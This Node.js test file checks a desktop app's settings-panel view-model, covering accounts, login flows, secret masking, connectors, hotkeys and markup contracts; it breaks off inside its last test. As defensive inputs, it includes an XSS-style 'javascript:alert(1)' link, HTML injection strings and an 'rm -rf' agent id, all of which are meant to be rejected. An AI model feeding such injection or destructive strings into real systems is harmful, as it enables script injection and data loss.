'use strict';
/* #306 — pure checks for frontend/settings-view.js (the settings panel's view-model).
   No DOM, no network, no secrets. Contracts: docs/desktop-visual-language.md §1-§4,
   apps/desktop-daemon/docs/PROTOCOL.md (Provider settings flow, Connectors frames),
   docs/r6-states-mapping (no hover-only meaning).
   Run: node apps/desktop-tauri/test-node/settings-view-check.cjs (also under cargo test). */
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const frontend = path.join(__dirname, '..', 'frontend');
const S = require(path.join(frontend, 'settings-view.js'));
let passed = 0;
const test = (name, fn) => { fn(); passed += 1; };

test('F055 general volume uses default and inclusive boundaries without coercion', () => {
  assert.equal(S.generalView({}).sound.gain, 0.12);
  for (const gain of [0, 0.12, 0.2]) assert.equal(S.generalView({ gain }).sound.gain, gain);
  for (const gain of [-0.1, 0.21, NaN, Infinity, '0.1', null]) assert.equal(S.generalView({ gain }).sound.gain, 0.12);
  assert.equal(S.soundGainProblem(''), 'Ingresá un volumen entre 0 y 0,2.');
  for (const value of ['0', '0.12', '0.2']) assert.equal(S.soundGainProblem(value), '');
  for (const value of ['-0.01', '0.201', 'Infinity', 'NaN', 'junk']) assert.ok(S.soundGainProblem(value));
});

// ---- screens (copied from gentle-dot: one screen per header button, each covering the chat body) -------
test('#408 seven sub-tabs of ONE Ajustes entry, in one table: Cuentas, Conectores, Modelos, Especialistas, Pills, Apariencia, General', () => {
  assert.deepEqual(S.TABS.map(x => x.id), ['accounts', 'connectors', 'models', 'specialists', 'pills', 'appearance', 'general']);
  assert.deepEqual(S.TABS.map(x => x.title), ['Cuentas', 'Conectores', 'Modelos', 'Especialistas', 'Pills', 'Apariencia', 'General']);
  for (const x of S.TABS) { assert.ok(x.icon, x.id); assert.ok(x.hint.length > 10, x.id); }
  assert.equal(S.tabById('connectors').title, 'Conectores');
  assert.equal(S.tabById('nope'), null);
  assert.equal(S.SCREENS, undefined);
});

test('#408 tablist keyboard: arrows wrap, Home/End jump, other keys are ignored', () => {
  assert.equal(S.tabKeyTarget('accounts', 'ArrowRight'), 'connectors');
  assert.equal(S.tabKeyTarget('general', 'ArrowRight'), 'accounts');
  assert.equal(S.tabKeyTarget('accounts', 'ArrowLeft'), 'general');
  assert.equal(S.tabKeyTarget('pills', 'Home'), 'accounts');
  assert.equal(S.tabKeyTarget('pills', 'End'), 'general');
  assert.equal(S.tabKeyTarget('pills', 'a'), null);
  assert.equal(S.tabKeyTarget('nope', 'ArrowRight'), null);
});

// ---- connection chip -------------------------------------------------------------
test('the daemon connection is one icon + one word; a problem is never hidden', () => {
  assert.equal(S.connectionView({ connection: 'connected' }), null, 'a working connection shows nothing');
  const none = S.connectionView({ connection: 'no_daemon' });
  assert.deepEqual([none.word, none.icon, none.tone], ['Sin motor', 'plug-off', 'faint']);
  assert.match(none.aria, /no está corriendo/);
  assert.equal(S.connectionView({ connection: 'lost' }).word, 'Motor caído');
  assert.equal(S.connectionView({ connection: 'lost' }).tone, 'red');
  assert.equal(S.connectionView({ connection: 'bad_session' }).word, 'Sesión no válida');
  assert.equal(S.connectionView({ connection: 'refused' }).word, 'Motor no responde');
  assert.equal(S.connectionView(null).word, 'Conectando', 'no state yet is a wait, not «Sin motor» (see #310)');
  assert.equal(S.connectionView({ connection: 'whatever' }).word, 'Sin motor', 'unknown = honest «no motor», never «connected»');
});

// ---- providers & accounts ----------------------------------------------------------------
const state = (extra = {}) => ({ connection: 'connected', providers: [
  { id: 'anthropic', name: 'Anthropic', methods: ['api_key', 'oauth'], configured: false },
  { id: 'openai', name: 'OpenAI', methods: ['oauth'], configured: true }], accounts: [
  { accountId: 'personal', label: 'Personal', provider: 'anthropic', authMethod: 'api_key', configured: true },
  { accountId: 'work', label: 'Trabajo', provider: 'openai', authMethod: 'none', configured: false },
  { accountId: 'lmstudio', label: 'LM Studio', provider: 'local-lmstudio', authMethod: 'api_key', configured: true, local: true }],
  profiles: { profiles: [{ id: 'main', label: 'Principal', provider: 'anthropic', modelId: 'claude' }], active: 'main' },
  auth: { flowId: null, prompt: null, event: null, last: null }, connectors: { state: 'loading', items: [] }, ...extra });

test('accounts: name + provider chip + a state that never says «ready» for an account that is not signed in', () => {
  const rows = S.accountRows(state());
  assert.deepEqual(rows.map(r => r.label), ['Personal', 'Trabajo', 'LM Studio']);
  const [personal, work, local] = rows;
  assert.equal(personal.providerName, 'Anthropic');
  assert.deepEqual([personal.state.word, personal.state.tone], ['', 'go']);
  assert.equal(personal.active, true, 'the active profile uses it');
  assert.deepEqual([work.state.word, work.state.icon, work.state.tone], ['Sin sesión', 'plug-off', 'faint']);
  assert.equal(work.actions.includes('login'), true);
  assert.equal(personal.actions.includes('logout'), true);
  assert.equal(local.local, true); assert.equal(local.chips.some(c => c.text === 'local'), true);
  assert.equal(local.actions.includes('login'), false, 'a local endpoint takes no key/login');
  // an account the active profile uses cannot be removed (the daemon refuses: hide the dead action)
  assert.equal(personal.actions.includes('remove'), false);
  assert.equal(work.actions.includes('remove'), true);
});

test('login methods come only from what the provider offers, in a fixed preference', () => {
  assert.deepEqual(S.loginMethods(state(), 'personal'), ['api_key', 'oauth']);
  assert.deepEqual(S.loginMethods(state(), 'work'), ['oauth']);
  assert.deepEqual(S.loginMethods(state(), 'ghost'), []);
});

test('create account: needs a provider from the list and a safe label; the form says one word when invalid', () => {
  assert.deepEqual(S.createValidity(state(), 'anthropic', 'Mi cuenta'), { ok: true, word: '' });
  assert.equal(S.createValidity(state(), '', 'Mi cuenta').ok, false);
  assert.equal(S.createValidity(state(), 'nope', 'Mi cuenta').ok, false, 'a provider the daemon did not list is refused');
  assert.equal(S.createValidity(state(), 'anthropic', '   ').word, '');
  assert.equal(S.createValidity(state(), 'anthropic', '').ok, false);
  assert.equal(S.createValidity(state(), 'anthropic', 'x'.repeat(81)).word, 'Muy largo');
  assert.equal(S.createValidity(state(), 'anthropic', 'a\nb').word, 'No válido');
  assert.equal(S.createValidity(state({ connection: 'no_daemon' }), 'anthropic', 'ok').ok, false, 'no daemon, no create');
});

// ---- the sign-in flow: secrets -------------------------------------------------------------------
test('a key-like prompt is ALWAYS masked, even when a provider forgot the secret flag', () => {
  const p = (over) => ({ flowId: 'f', promptId: 'p', kind: 'input', message: 'Pegá tu API key', secret: false, ...over });
  assert.equal(S.maskInput(p({ secret: true })), true);
  assert.equal(S.maskInput(p({ message: 'Enter your API key' })), true);
  assert.equal(S.maskInput(p({ message: 'Token de acceso' })), true);
  assert.equal(S.maskInput(p({ message: 'Contraseña' })), true);
  assert.equal(S.maskInput(p({ message: 'Secret' })), true);
  assert.equal(S.maskInput(p({ placeholder: 'sk-...' , message: 'Valor' })), true);
  assert.equal(S.maskInput(p({ message: 'Nombre del proyecto' })), false);
  assert.equal(S.maskInput(null), true, 'no prompt data = mask (safer default)');
});

test('prompt view: select options are buttons with labels; an input is a field; never a value', () => {
  const input = S.promptView({ flowId: 'f', promptId: 'p', kind: 'input', message: 'Pegá tu API key', secret: true, placeholder: '', options: [] });
  assert.equal(input.control, 'input'); assert.equal(input.masked, true); assert.equal(input.message, 'Pegá tu API key');
  assert.equal(Object.keys(input).includes('value'), false);
  const select = S.promptView({ flowId: 'f', promptId: 'p', kind: 'select', message: 'Elegí', secret: false, options: [{ id: 'a', label: 'Opción A' }, { id: 'b', label: 'Opción B' }] });
  assert.equal(select.control, 'select'); assert.deepEqual(select.options.map(o => o.label), ['Opción A', 'Opción B']);
  assert.equal(S.promptView(null), null);
});

test('reply validity mirrors the Rust bounds (the host is still the authority)', () => {
  assert.equal(S.replyValid('sk-abc'), true);
  assert.equal(S.replyValid(''), false); assert.equal(S.replyValid('   '), false, 'whitespace only is not a key');
  assert.equal(S.replyValid('a\u0000b'), false); assert.equal(S.replyValid('x'.repeat(4097)), false);
  assert.equal(S.replyValid('x'.repeat(4096)), true);
});

test('OAuth events: device code and link are shown; a non-https link is NEVER offered', () => {
  const ev = S.eventView({ kind: 'url', message: 'Abrí el enlace', userCode: 'ABCD-1234', url: 'https://example.com/device', instructions: '' });
  assert.equal(ev.userCode, 'ABCD-1234'); assert.equal(ev.link, 'https://example.com/device');
  assert.equal(S.eventView({ kind: 'url', url: 'javascript:alert(1)', userCode: 'X' }).link, null);
  assert.equal(S.eventView({ kind: 'url', url: 'http://example.com' }).link, null, 'plain http is not a login link');
  assert.equal(S.eventView(null), null);
});

test('flow outcome: «Listo» only on a real ok; a cancel/failure says so; nothing infers success', () => {
  assert.deepEqual([S.flowOutcome({ ok: true }).word, S.flowOutcome({ ok: true }).tone], ['Conectada', 'go']);
  assert.deepEqual([S.flowOutcome({ ok: false, cancelled: true }).word, S.flowOutcome({ ok: false, cancelled: true }).tone], ['Cancelado', 'faint']);
  assert.deepEqual([S.flowOutcome({ ok: false }).word, S.flowOutcome({ ok: false }).tone], ['No se pudo', 'red']);
  assert.equal(S.flowOutcome(null), null);
});

// ---- connectors --------------------------------------------------------------------------------------------
test('connectors: honest «no disponible» when the daemon has no connectorsCommand; states by icon+word', () => {
  assert.equal(S.connectorsView({ connectors: { state: 'unavailable', items: [] } }).kind, 'unavailable');
  assert.equal(S.connectorsView({ connectors: { state: 'unavailable', items: [] } }).word, 'No disponible');
  assert.equal(S.connectorsView({ connectors: { state: 'failed', items: [] } }).word, 'Sin datos');
  assert.equal(S.connectorsView({ connectors: { state: 'loading', items: [] } }).kind, 'loading');
  const ready = S.connectorsView({ connectors: { state: 'ready', items: [
    { id: 'gmail', label: 'Gmail', mode: 'read_only', enabled: true, configured: true, status: 'connected' },
    { id: 'slack', label: 'Slack', mode: 'read_and_send', enabled: true, configured: true, status: 'failed' },
    { id: 'drive', label: 'Drive', mode: 'read_only', enabled: false, configured: true, status: 'disabled' },
    { id: 'cal', label: 'Calendario', mode: 'read_only', enabled: true, configured: false, status: 'needs_setup' },
    { id: 'x', label: 'Otro', mode: 'weird', enabled: true, configured: true, status: 'surprise' }] } });
  assert.equal(ready.kind, 'ready');
  assert.deepEqual(ready.items.map(i => [i.label, i.word, i.tone]), [
    ['Gmail', '', 'go'], ['Slack', 'Falló', 'red'], ['Drive', 'Apagado', 'faint'], ['Calendario', 'Falta configurar', 'sun'], ['Otro', 'Desconocido', 'faint']]);
  assert.equal(ready.items[1].sends, true, 'read_and_send is shown (chip «puede enviar»)');
  assert.equal(ready.items[0].sends, false);
  assert.equal(S.connectorsView({ connectors: { state: 'ready', items: [] } }).empty, true);
  // these are the PERSISTED values, not live: say so
  assert.match(S.CONNECTORS_NOTE, /guardad/i);
});

// ---- general --------------------------------------------------------------------------------------------------------
test('general: sound switch is persisted (default OFF), motion is «respect the system» (default animate), hotkey shows its backend state', () => {
  assert.equal(S.soundDefault(), false);
  const g = S.generalView({ sound: false, motionOverride: true, hotkey: { combo: 'Ctrl+Alt+A', enabled: true, status: 'active', limited: false, backend: 'portal', portal_note: null } });
  assert.equal(g.sound.on, false);
  assert.equal(g.motion.respectSystem, false, 'motionOverride true = animate (do NOT honor the system)');
  assert.equal(S.generalView({ sound: true, motionOverride: false, hotkey: null }).motion.respectSystem, true);
  assert.equal(S.generalView({ sound: true, motionOverride: false, hotkey: null }).sound.on, true);
  assert.equal(g.hotkey.combo, 'Ctrl+Alt+A'); assert.equal(g.hotkey.backendLabel, 'Atajo del sistema');
  const x11 = S.generalView({ sound: false, motionOverride: true, hotkey: { combo: 'Ctrl+Alt+A', enabled: true, status: 'active', limited: true, backend: 'x11', portal_note: 'permission_denied' } });
  assert.equal(x11.hotkey.backendLabel, 'Atajo limitado (X11)'); assert.match(x11.hotkey.note, /rechazaste/i);
  // U3a: Windows' RegisterHotKey is a REAL backend. Normalizing anything that
  // is not portal to «Atajo de X11» is precisely the lie the port must not ship.
  const win = S.generalView({ sound: false, motionOverride: true, hotkey: { combo: 'Ctrl+Alt+A', enabled: true, status: 'active', limited: false, backend: 'win32', portal_note: null } });
  assert.equal(win.hotkey.backend, 'win32');
  assert.equal(win.hotkey.backendLabel, 'Atajo de Windows');
  const winTaken = S.generalView({ sound: false, motionOverride: true, hotkey: { combo: 'Ctrl+Alt+A', enabled: true, status: 'taken', limited: false, backend: 'win32', portal_note: null } });
  assert.equal(winTaken.hotkey.backendLabel, 'Atajo de Windows', 'a denied grab still names the right backend');
  assert.equal(S.generalView({ sound: false, motionOverride: true, hotkey: { combo: 'Ctrl+Alt+A', enabled: false, status: 'disabled', limited: false, backend: 'x11', portal_note: null } }).hotkey.enabled, false);
  assert.equal(S.generalView({}).sound.on, false); assert.equal(S.generalView(null).hotkey, null);
});

test('hotkey capture: a pressed combination becomes the canonical text; Escape cancels; bare keys are refused', () => {
  const ev = (key, extra = {}) => ({ key, code: 'Key' + String(key).toUpperCase(), ctrlKey: false, altKey: false, shiftKey: false, metaKey: false, isTrusted: true, isComposing: false, repeat: false, ...extra });
  assert.deepEqual(S.captureCombo(ev('a', { ctrlKey: true, altKey: true })), { kind: 'combo', text: 'Ctrl+Alt+A' });
  assert.deepEqual(S.captureCombo(ev('7', { code: 'Digit7', metaKey: true, shiftKey: true })), { kind: 'combo', text: 'Shift+Super+7' });
  assert.deepEqual(S.captureCombo(ev('F5', { code: 'F5', ctrlKey: true })), { kind: 'combo', text: 'Ctrl+F5' });
  assert.deepEqual(S.captureCombo(ev(' ', { code: 'Space', altKey: true })), { kind: 'combo', text: 'Alt+Space' });
  assert.equal(S.captureCombo(ev('Escape', { code: 'Escape' })).kind, 'cancel');
  assert.equal(S.captureCombo(ev('a')).kind, 'needs_modifier', 'a bare key would steal typing');
  assert.equal(S.captureCombo(ev('a', { shiftKey: true })).kind, 'needs_modifier');
  assert.equal(S.captureCombo(ev('Control', { code: 'ControlLeft', ctrlKey: true })).kind, 'wait', 'a modifier alone keeps listening');
  assert.equal(S.captureCombo(ev('Enter', { code: 'Enter', ctrlKey: true })).kind, 'unsupported');
  assert.equal(S.captureCombo(ev('a', { ctrlKey: true, isTrusted: false })).kind, 'ignore', 'synthetic events never set a shortcut');
  assert.equal(S.captureCombo(ev('a', { ctrlKey: true, isComposing: true })).kind, 'ignore');
  assert.equal(S.captureCombo(ev('a', { ctrlKey: true, repeat: true })).kind, 'ignore');
});

// ---- accessibility / markup contract ------------------------------------------------------------------------------------------
test('markup: gear + every icon-only control is named; sections are real tabs; the page keeps voseo', () => {
  const html = fs.readFileSync(path.join(frontend, 'index.html'), 'utf8');
  assert.match(html, /<script defer src="settings-view\.js"><\/script>/);
  assert.match(html, /<script defer src="settings\.js"><\/script>/);
  assert.match(html, /id="open-settings"[^>]*aria-label="Ajustes"/);
  assert.match(html, /id="settings"[^>]*role="dialog"[^>]*aria-label="Ajustes"/);
  assert.match(html, /id="settings-tabs"[^>]*role="tablist"[^>]*aria-label="[^"]{3,}"/, '#408: a real tablist');
  for (const id of ['accounts', 'connectors']) assert.doesNotMatch(html, new RegExp(`id="open-screen-${id}"`), id + ' has no header button of its own');
  assert.doesNotMatch(html, /id="chat-models"/, 'the Modelo header button moved into the Modelos tab');
  const gear = /<button[^>]*id="open-screen-settings"[^>]*>/.exec(html);
  assert.ok(gear); assert.match(gear[0], /aria-label="Ajustes"/); assert.match(gear[0], /aria-expanded="false"/);
  assert.match(html, /<h2[^>]*id="settings-title"/, 'the screen title is a real heading');
  assert.match(html, /id="settings-close"[^>]*aria-label="[^"]{3,}"/);
});
test('wiring: only the closed IPC; a masked field never reaches the DOM as text and is cleared after sending', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  assert.match(src, /agent_action/); assert.match(src, /prefs_action/); assert.match(src, /hotkey_action/);
  assert.doesNotMatch(src, /localStorage|sessionStorage|indexedDB|document\.cookie/, 'no secret or setting is kept in the page');
  assert.doesNotMatch(src, /console\.(log|info|debug)/, 'nothing is logged from the settings page');
  // NO markup is written at all: icons are DOM nodes from the closed registry
  assert.doesNotMatch(src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, ''), /innerHTML|outerHTML|insertAdjacentHTML|document\.write/, 'no markup sink in settings.js');
  assert.match(src, /new DOMParser\(\)/);
  assert.match(src, /\.type = prompt\.masked \? 'password' : 'text'/, 'a masked prompt renders a password input');
  assert.match(src, /autocomplete = 'off'|autocomplete="off"|new-password/, 'the browser never offers to save a key');
  assert.match(src, /\.value = ''/, 'the field is cleared after the reply is sent');
  assert.match(src, /N\.trusted\(event\)|isTrusted/, 'only trusted gestures change a setting');
});

test('the probe seam is one inert CustomEvent that only selects a tab (never a setting), and no global hook exists', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  assert.match(src, /addEventListener\('abito:settings-select'/);
  assert.doesNotMatch(src, /window\.__[A-Za-z]+\s*=/, 'no window-level test hook in the shipped file');
  const seam = src.slice(src.indexOf("addEventListener('abito:settings-select'"), src.indexOf("addEventListener('abito:settings-select'") + 380);
  assert.doesNotMatch(seam, /agent\(|prefs_action|hotkey_action|animateAnyway|respectSystemMotion/, 'the seam cannot change a setting');
});

test('connectors: without a live engine «loading» is never an endless spinner (honest «sin motor»)', () => {
  for (const connection of ['no_daemon', 'lost', 'bad_session', 'refused']) {
    const state = { connection, connectors: { state: 'loading', items: [] } };
    const v = S.connectorsView(state);
    assert.notEqual(v.kind, 'loading', connection);
    assert.equal(v.word, S.connectionView(state).word, `${connection}: same honest word as the connection chip`);
  }
  assert.equal(S.connectorsView({ connection: 'no_daemon', connectors: { state: 'loading', items: [] } }).word, 'Sin motor');
  assert.equal(S.connectorsView({ connection: 'connecting', connectors: { state: 'loading', items: [] } }).kind, 'loading', 'connecting is a real wait');
  assert.equal(S.connectorsView({ connection: 'connected', connectors: { state: 'loading', items: [] } }).kind, 'loading');
});

test('style: form fields are dark controls (the provider select was white with unreadable text)', () => {
  const css = fs.readFileSync(path.join(__dirname, '..', 'frontend', 'style.css'), 'utf8');
  const rule = css.slice(css.indexOf('.sfield {'), css.indexOf('}', css.indexOf('.sfield {')));
  assert.match(rule, /color-scheme:\s*dark/);
  assert.match(css, /select\.sfield\s*\{[^}]*appearance:\s*none/);
});

// ---- never announce a result the engine did not give (verifier, #306) --------------------------
const ac = (code, n, extra = {}) => ({ ...state({ connection: 'connected' }), last_error: { code, n }, ...extra });
test('outcome: success is announced only when no engine error arrived after the command', () => {
  const sent = ac(null, 0);
  assert.deepEqual(S.commandOutcome(sent, ac(null, 0), 'Cuenta Casa creada.'), { ok: true, say: 'Cuenta Casa creada.' });
  // an error that arrived while the command was in flight (same state otherwise)
  for (const [code, word] of [['failed', 'No se pudo'], ['busy', 'Motor ocupado'], ['bad_request', 'Pedido no válido'], ['rate_limited', 'Demasiados pedidos']]) {
    const r = S.commandOutcome(ac(null, 0), ac(code, 1), 'Cuenta Casa creada.');
    assert.equal(r.ok, false, code);
    assert.equal(r.word, word, code);
    assert.ok(r.icon && r.tone, code);
    assert.ok(!r.say.includes('creada'), `${code}: the success text is never said (${r.say})`);
    assert.ok(r.say.includes(word), code);
  }
  // the SAME code twice is a new event: the counter decides
  assert.equal(S.commandOutcome(ac('failed', 4), ac('failed', 5), 'x').ok, false);
  assert.equal(S.commandOutcome(ac('failed', 4), ac('failed', 4), 'x.').ok, true, 'an old error is not this command\'s');
  // no engine / lost connection after the command: no success either
  assert.equal(S.commandOutcome(ac(null, 0), state({ connection: 'lost' }), 'Hecho.').ok, false);
  assert.equal(S.commandOutcome(null, null, 'Hecho.').ok, false);
  // an unknown code reads as the generic failure, never as text
  assert.equal(S.commandOutcome(ac(null, 0), ac('<b>x</b>', 1), 'Hecho.').word, 'No se pudo');
});

test('hotkey: «cambiado» only when the backend really took it; taken/invalid/denied say so', () => {
  const view = (status, extra = {}) => ({ combo: 'Ctrl+Alt+K', enabled: true, status, backend: 'x11', ...extra });
  assert.deepEqual(S.hotkeySetOutcome(view('active'), 'Ctrl+Alt+K'), { ok: true, say: 'Atajo cambiado a Ctrl+Alt+K.' });
  assert.equal(S.hotkeySetOutcome(view('taken'), 'Ctrl+Alt+K').ok, false);
  assert.match(S.hotkeySetOutcome(view('taken'), 'Ctrl+Alt+K').say, /ocupado/i);
  assert.match(S.hotkeySetOutcome(view('invalid'), 'Ctrl+Alt+K').say, /inválido/i);
  assert.match(S.hotkeySetOutcome(view('unsupported'), 'Ctrl+Alt+K').say, /soporte/i);
  assert.match(S.hotkeySetOutcome(view('permission_denied'), 'Ctrl+Alt+K').say, /permiso/i);
  for (const status of ['taken', 'invalid', 'unsupported', 'permission_denied']) assert.ok(!/cambiado/i.test(S.hotkeySetOutcome(view(status), 'Ctrl+Alt+K').say), status);
  // portal: the OS dialog is still open — not changed yet, not failed either
  const pending = S.hotkeySetOutcome(view('permission_pending', { backend: 'portal' }), 'Ctrl+Alt+K');
  assert.equal(pending.ok, null);
  assert.match(pending.say, /confirm|permiso|sistema/i);
  assert.ok(!/cambiado/i.test(pending.say));
  // the combo shown is the one the backend reports, not what was typed
  assert.equal(S.hotkeySetOutcome(view('active', { combo: 'Ctrl+Alt+J' }), 'Ctrl+Alt+K').say, 'Atajo cambiado a Ctrl+Alt+J.');
  assert.equal(S.hotkeySetOutcome(null, 'Ctrl+Alt+K').ok, false);
});

test('draft: what the human typed survives a re-render and never leaks into the next form', () => {
  const d = S.makeDrafts();
  assert.equal(d.get('settings-secret'), '');
  d.set('settings-secret', 'sk-abc');
  assert.equal(d.get('settings-secret'), 'sk-abc');
  d.clear('settings-secret');
  assert.equal(d.get('settings-secret'), '', 'cleared the moment it is sent');
  // a different prompt is a different form: the old key is NOT carried into it
  d.scope('flow-1'); d.set('settings-secret', 'sk-old'); d.scope('flow-1');
  assert.equal(d.get('settings-secret'), 'sk-old', 'same scope: kept');
  d.scope('flow-2');
  assert.equal(d.get('settings-secret'), '', 'a new prompt starts empty');
  d.set('settings-secret', 'sk-new'); d.reset();
  assert.equal(d.get('settings-secret'), '');
});

test('wiring: the motion switch, the clear-on-send of the secret and the draft are wired (source contract)', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  // motion: switch -> exactly one of the two backend calls, then the REAL answer drives the label
  assert.match(src, /sw-motion/);
  assert.match(src, /g\.motion\.respectSystem \? window\.desktop\.animateAnyway\(\) : window\.desktop\.respectSystemMotion\(\)/);
  assert.match(src, /motionOverride = s\.motionOverride !== false/);
  // the secret field: draft kept across renders, wiped at send, never rendered back
  assert.match(src, /drafts\.set\('settings-secret'/);
  assert.match(src, /drafts\.clear\('settings-secret'\)/);
  assert.doesNotMatch(src, /createDraft[^\n]*secret/);
  // no success text is said before the engine answered
  assert.doesNotMatch(src, /agent\(payload\)\.then\(next => \{ busy = false; applyAgent\(next\); if \(okSay\) say\(okSay\)/);
  assert.match(src, /commandOutcome\(/);
  assert.match(src, /hotkeySetOutcome\(/);
});

// ---- cheap UX defects found by the verifier -----------------------------------------------------
// CSS specificity as (ids, classes+attributes+pseudo, types), enough for the selectors used here.
const specificity = sel => {
  const ids = (sel.match(/#[\w-]+/g) || []).length;
  const attrs = (sel.match(/\[[^\]]+\]/g) || []).length + (sel.match(/:(?!not\b)[\w-]+/g) || []).length;
  const negated = (sel.match(/:not\(([^)]*)\)/g) || []).map(n => specificity(n.slice(5, -1)));
  const sum = negated.reduce((a, b) => [a[0] + b[0], a[1] + b[1]], [0, 0]);
  return [ids + sum[0], attrs + sum[1]];
};
const cmp = (a, b) => a[0] - b[0] || a[1] - b[1];
test('style: the rules that HIDE the gear are at least as specific as the rule that shows it', () => {
  const css = fs.readFileSync(path.join(__dirname, '..', 'frontend', 'style.css'), 'utf8').replace(/\/\*[\s\S]*?\*\//g, '');
  const rules = [...css.matchAll(/(^|\n)([^{}\n][^{}]*#open-settings[^{}]*)\{([^}]*)\}/g)].map(m => ({ sel: m[2].trim(), body: m[3] }));
  const shows = rules.filter(r => /visibility:\s*visible/.test(r.body));
  const hides = rules.filter(r => /visibility:\s*hidden/.test(r.body) && /\[data-(card|question)/.test(r.sel));
  assert.ok(shows.length >= 1 && hides.length >= 1);
  for (const h of hides) for (const sh of shows) {
    for (const part of h.sel.split(',').map(x => x.trim())) assert.ok(cmp(specificity(part), specificity(sh.sel)) >= 0, `«${part}» would lose to «${sh.sel}»`);
  }
});

test('focus: closing the panel by keyboard lands on something visible in the CHAT view (the gear is overview-only)', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  const close = src.slice(src.indexOf('function close('), src.indexOf('const isOpen'));
  assert.match(close, /chat-input/, 'focus goes back to the chat input');
  assert.doesNotMatch(close, /AbitoFocusHome/);
});

test('layout: a screen scrolls inside its own body, so the close bar is always inside even in the shortest column (240)', () => {
  const css = fs.readFileSync(path.join(__dirname, '..', 'frontend', 'style.css'), 'utf8').replace(/\/\*[\s\S]*?\*\//g, '');
  const px = (re, d) => { const m = css.match(re); return m ? Number(m[1]) : d; };
  assert.match(css.match(/#settings-body \{([^}]*)\}/)[1], /overflow-y:\s*auto/);
  assert.match(css.match(/#settings-body \{([^}]*)\}/)[1], /min-height:\s*0/);
  const win = 256 /* shortest native window: CHAT_MIN_H 240 + margins */, top = px(/#settings \{[^}]*top:\s*(\d+)px/, 8), bottom = px(/#settings \{[^}]*bottom:\s*(\d+)px/, 8);
  const bar = px(/#settings-bar \{[^}]*min-height:\s*(\d+)px/, 44);
  assert.ok(win - top - bottom >= bar + 44, `the panel (${win - top - bottom}px) must hold the bar and at least one row`);
});

// ---- Cuentas: connected list, two method cards, provider list with search (gentle-dot AccountsPanel) ----
const st2 = (extra = {}) => state({ providers: [
  { id: 'anthropic', name: 'Anthropic', methods: ['api_key', 'oauth'], configured: true },
  { id: 'openai', name: 'OpenAI', methods: ['oauth'], configured: false },
  { id: 'groq', name: 'Groq', methods: ['api_key'], configured: false }], ...extra });

test('accounts: two method cards, in gentle-dot wording', () => {
  assert.deepEqual(S.METHOD_CARDS.map(c => c.id), ['oauth', 'api_key']);
  assert.equal(S.METHOD_CARDS[0].title, 'Usar una suscripción');
  assert.equal(S.METHOD_CARDS[1].title, 'Usar una clave de API');
  for (const c of S.METHOD_CARDS) assert.ok(c.hint.length > 30);
});

test('accounts: the provider list is filtered by method and by the search box', () => {
  const ids = (m, f) => S.providerList(st2(), m, f).map(p => p.id);
  assert.deepEqual(ids('oauth', ''), ['anthropic', 'openai']);
  assert.deepEqual(ids('api_key', ''), ['anthropic', 'groq']);
  assert.deepEqual(ids('api_key', '  GRO '), ['groq'], 'case-insensitive, trimmed');
  assert.deepEqual(ids('api_key', 'zzz'), []);
  assert.deepEqual(ids('weird', ''), [], 'an unknown method lists nothing');
  const row = S.providerList(st2(), 'oauth', '')[0];
  assert.equal(row.name, 'Anthropic'); assert.equal(row.connected, true);
  assert.equal(S.providerList(st2(), 'oauth', '')[1].connected, false);
  assert.equal(S.providerList(st2(), 'oauth', '')[0].actionLabel, 'Iniciar sesión');
  assert.equal(S.providerList(st2(), 'api_key', '')[0].actionLabel, 'Usar una clave de API');
});

test('accounts: «Iniciar sesión» uses the provider\'s account, or creates one named after the provider first', () => {
  const have = S.loginPlan(st2(), 'anthropic', 'oauth');
  assert.deepEqual(have, { kind: 'start', accountId: 'personal', method: 'oauth' });
  const none = S.loginPlan(st2(), 'groq', 'api_key');
  assert.deepEqual(none, { kind: 'create', provider: 'groq', label: 'Groq', method: 'api_key' });
  assert.equal(S.loginPlan(st2(), 'groq', 'oauth'), null, 'a method the provider does not offer');
  assert.equal(S.loginPlan(st2(), 'nope', 'oauth'), null);
  assert.equal(S.loginPlan(st2({ connection: 'no_daemon' }), 'groq', 'api_key'), null, 'no engine, no login');
  // a hostile provider name never becomes a label with control characters
  const hostile = st2({ providers: [{ id: 'evil', name: 'Ev\nil' + 'x'.repeat(200), methods: ['api_key'], configured: false }] });
  const plan = S.loginPlan(hostile, 'evil', 'api_key');
  assert.equal(plan.kind, 'create');
  assert.ok(!/[\u0000-\u001f]/.test(plan.label) && Array.from(plan.label).length <= 80);
});

test('accounts: after creating, the login starts as soon as the NEW account appears (never one that already existed)', () => {
  const pending = S.pendingLogin(st2(), 'groq', 'api_key');
  assert.deepEqual(pending.known, ['personal', 'work', 'lmstudio']);
  assert.equal(S.pendingLoginReady(st2(), pending), null, 'nothing new yet');
  const after = st2({ accounts: [...st2().accounts, { accountId: 'groq-1', label: 'Groq', provider: 'groq', authMethod: 'none', configured: false }] });
  assert.deepEqual(S.pendingLoginReady(after, pending), { accountId: 'groq-1', method: 'api_key' });
  const other = st2({ accounts: [...st2().accounts, { accountId: 'x', label: 'X', provider: 'openai', authMethod: 'none', configured: false }] });
  assert.equal(S.pendingLoginReady(other, pending), null, 'a new account of ANOTHER provider is not ours');
});

test('accounts: the connected list shows only signed-in accounts, with «Salir»', () => {
  const rows = S.connectedAccounts(st2());
  assert.ok(rows.every(r => r.signedIn || r.local));
  assert.ok(rows.find(r => r.accountId === 'personal'));
  assert.equal(rows.find(r => r.accountId === 'work'), undefined, 'a signed-out account is not «Conectada»');
});

// ---- Conectores: agents (one click, no terminal) + services ----------------------------------------
const agentsState = (list, extra = {}) => state({ agents: list, ...extra });
test('agents: three known agents, names from OUR table, never from the engine payload', () => {
  assert.deepEqual(S.AGENT_IDS, ['claude-code', 'codex', 'opencode']);
  const v = S.agentsView(agentsState([{ id: 'claude-code', name: '<b>pwn</b>', state: 'not_connected', backup: false, detail: null }]));
  assert.equal(v.kind, 'ready');
  assert.equal(v.rows[0].name, 'Claude Code');
  assert.deepEqual(v.rows.map(r => r.id), ['claude-code']);
  // an id outside the allowlist is dropped, a duplicate keeps the first
  const odd = S.agentsView(agentsState([{ id: 'rm -rf', state: 'connected' }, { id: 'codex', state: 'connected' }, { id: 'codex', state: 'error' }]));
  assert.deepEqual(odd.rows.map(r => r.id), ['codex']);
